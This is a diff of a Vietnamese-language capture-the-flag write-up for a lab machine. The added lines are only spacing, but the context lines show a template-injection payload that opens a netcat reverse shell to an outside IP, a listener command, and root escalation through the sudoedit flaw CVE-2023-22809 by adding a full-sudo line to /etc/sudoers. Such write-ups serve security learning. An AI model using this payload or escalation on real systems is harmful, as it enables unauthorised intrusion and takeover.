@@ -110,6 +110,7 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u h
 - Có vẻ payload thực thi thành công, tiến hành tạo `reverse shell`
 
 - Tạo shell trên revshells.com
+
 ![Hoangdeptrai](Images/Reverse.com.png)
 
 - Ta được payload:
@@ -117,11 +118,13 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u h
 &settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.21.175.20 1234 -e /bin/sh');//
 ```
 - Chèn payload thông qua `Burp Suite`, listen port: `nc -lvnp 1234`
+
 ![Hoangdeptrai](Images/Insert_payload.png)
 
 ![Hoangdeptrai](Images/Reverse_shell.png)
 
 - Sau khi nhận `reverse shell` thành công, update shell cho dễ nhìn:
+
 ![Hoangdeptrai](Images/Update_shell.png)
 
 - Tìm kiếm web flag, tìm được trong file `/home/web/user.txt`
@@ -132,6 +135,7 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u h
 
 ## ⚠️5. Leo quyền lên root shell
 - Kiểm tra những quyền có thể chạy với sudo qua lệnh `sudo -l`
+
 ![Hoangdeptrai](Images/sudo-l.png)
 
 - Có thể thấy ta có quyền chạy `sudoedit` với quyền sudo
@@ -141,6 +145,7 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u h
 ![Hoangdeptrai](Images/sudoedit_cve.png)
 
 - `CVE-2023-22809` cho phép leo thang đặc quyền với `sudo 1.8.0 đến 1.9.12p1`
+
 ![Hoangdeptrai](Images/CVE-2023-22809.png)
 - Kiểm tra phiên bản sudo của máy chủ:
 
@@ -160,6 +165,7 @@ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
 - Sau khi thành công mở file `/etc/sudoers` bằng `vi`, chèn thêm dòng `web ALL=(ALL:ALL) ALL` với mục đích cho user `web` có toàn quyền `sudo`
 
 ![Hoangdeptrai](Images/All_root.png)
+
 - Sau khi chèn thành công, `sudo su` để vào quyền root
 
 ![Hoangdeptrai](Images/Sudo-su.png)
